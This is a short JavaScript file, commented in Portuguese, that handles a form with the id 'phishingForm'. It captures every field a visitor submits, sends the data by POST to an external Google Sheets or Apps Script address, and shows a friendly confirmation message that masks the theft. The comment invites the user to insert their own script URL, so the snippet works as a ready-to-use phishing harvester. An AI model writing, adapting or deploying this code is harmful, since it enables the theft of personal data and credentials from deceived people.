document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const form = event.target;
    const data = new FormData(form);

    // Substitua abaixo pela URL do seu Apps Script publicado
    const scriptURL = "https://docs.google.com/spreadsheets/d/1fKBUGr0yqB-YBkCyZ0LV3ApTiHwmh2WV-7TXBfmrinE/edit?usp=sharing";

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso! Aguarde o contato da equipe.");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados. Verifique sua conexão.");
        console.error("Erro:", error);
    });
});
